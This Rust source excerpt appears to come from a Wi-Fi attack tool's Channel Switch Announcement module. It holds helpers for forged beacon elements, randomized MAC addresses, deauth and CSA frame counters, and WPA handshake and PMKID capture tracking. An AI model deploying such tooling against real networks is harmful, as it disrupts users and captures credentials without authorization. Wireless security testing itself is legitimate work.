fn drain_rx(reader: &crate::pipeline::PipelineSubscriber, info: &Arc<Mutex<CsaInfo>>) {
    for _frame in reader.drain() {
        let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
        info.frames_received += 1;
    }
}

fn build_minimal_ies(ssid: &str, channel: u8) -> Vec<u8> {
    let mut ies = Vec::with_capacity(32);
    let ssid_bytes = ssid.as_bytes();
    let slen = ssid_bytes.len().min(32) as u8;
    ies.push(0x00); // SSID tag
    ies.push(slen);
    ies.extend_from_slice(&ssid_bytes[..slen as usize]);
    ies.extend_from_slice(&[0x01, 0x04, 0x82, 0x84, 0x8B, 0x96]); // Supported Rates
    ies.push(0x03); ies.push(0x01); ies.push(channel); // DS Parameter Set
    ies
}

fn random_mac(rng: &mut u32) -> MacAddress {
    let mut bytes = [0u8; 6];
    for b in &mut bytes {
        *b = (xorshift(rng) & 0xFF) as u8;
    }
    bytes[0] &= 0xFE; // unicast
    bytes[0] |= 0x02; // locally administered
    MacAddress::new(bytes)
}

fn xorshift(state: &mut u32) -> u32 {
    let mut x = *state;
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    *state = x;
    x
}

fn push_event(
    shared: &SharedAdapter,
    events: &Arc<EventRing<CsaEvent>>,
    start: Instant,
    kind: CsaEventKind,
    attack_id: AttackId,
) {
    let seq = events.seq() + 1;
    let timestamp = start.elapsed();

    shared.emit_updates(vec![StoreUpdate::AttackEvent {
        id: attack_id,
        seq,
        timestamp,
        event: AttackEventKind::Csa(kind.clone()),
    }]);

    events.push(CsaEvent { seq, timestamp, kind });
}

fn update_phase(
    shared: &SharedAdapter,
    info: &Arc<Mutex<CsaInfo>>,
    phase: CsaPhase,
    attack_id: AttackId,
) {
    shared.emit_updates(vec![StoreUpdate::AttackPhaseChanged {
        id: attack_id,
        phase: phase.to_attack_phase(),
    }]);

    let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
    info.phase = phase;
    info.elapsed = info.start_time.elapsed();
}

fn update_counters(
    info: &Arc<Mutex<CsaInfo>>,
    frames_sent: u64, bytes_sent: u64,
    csa_beacons_sent: u64, deauth_frames_sent: u64, stimulation_frames_sent: u64,
    round: u32, start: Instant,
    tx_fb: &Arc<crate::core::TxFeedback>,
    quality: HandshakeQuality, has_pmkid: bool,
    m1_seen: bool, m2_seen: bool,
    half_handshake_pivots: u32,
) {
    let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
    info.frames_sent = frames_sent;
    info.bytes_sent = bytes_sent;
    info.csa_beacons_sent = csa_beacons_sent;
    info.deauth_frames_sent = deauth_frames_sent;
    info.stimulation_frames_sent = stimulation_frames_sent;
    info.round = round;
    info.elapsed = start.elapsed();
    info.tx_feedback = tx_fb.snapshot();
    info.handshake_quality = quality;
    info.has_pmkid = has_pmkid;
    info.m1_seen = m1_seen;
    info.m2_seen = m2_seen;
    info.half_handshake_pivots = half_handshake_pivots;
}

fn emit_counters(
    shared: &SharedAdapter,
    attack_id: AttackId,
    info: &Arc<Mutex<CsaInfo>>,
    start: Instant,
    tx_fb: &Arc<crate::core::TxFeedback>,
) {
    let info = info.lock().unwrap_or_else(|e| e.into_inner());
    shared.emit_updates(vec![StoreUpdate::AttackCountersUpdate {
        id: attack_id,
        frames_sent: info.frames_sent,
        frames_received: info.frames_received,
        frames_per_sec: info.frames_per_sec,
        elapsed: start.elapsed(),
        tx_feedback: tx_fb.snapshot(),
    }]);
}

fn finish_attack(
    shared: &SharedAdapter,
    info: &Arc<Mutex<CsaInfo>>,
    events: &Arc<EventRing<CsaEvent>>,
    start: Instant,
    attack_id: AttackId,
    frames_sent: u64,
    reason: CsaStopReason,
    quality: HandshakeQuality,
) {
    {
        let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
        i.stop_reason = Some(reason);
    }

    push_event(shared, events, start, CsaEventKind::AttackComplete {
        frames_sent,
        elapsed: start.elapsed(),
        reason,
        quality,
    }, attack_id);

    shared.emit_updates(vec![StoreUpdate::AttackComplete {
        id: attack_id,
        attack_type: AttackType::Csa,
        result: AttackResult::Csa {
            frames_sent,
            handshake_quality: quality,
            stop_reason: reason,
        },
    }]);
}
